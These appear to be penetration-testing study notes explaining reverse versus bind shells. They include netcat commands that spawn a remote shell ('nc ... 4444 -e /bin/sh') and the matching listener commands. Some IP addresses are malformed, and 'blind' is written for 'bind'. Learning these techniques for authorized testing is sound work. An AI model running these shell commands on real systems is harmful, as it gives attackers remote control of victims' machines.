## Reverse versus Blind Shells
* Reverse shell means a victim connects to us. Target is connecting, attackbox is listening.  
  * We are listening on a port (nc -lvp 4444, lvp is listening verbose prot)
  * Victim machine is saying nc 192.168.1.1.1 4444 -e /bin/sh
* Blind shell (we connect to a victim) - we open a port on the machine, and then we connect to it
  * Exploit opens up port, so we connect through nc 192.1682.1.2 4444
  * On victim side, nc -lvp 4444 -e /bin/sh
 * You will be using reverse shells 95% of the time. Blind shells are most likely on external assessments.
   * Externals use bind shells - NAT through public IP address to connect to that port. Reverse, you would have to open up your home network to the world.
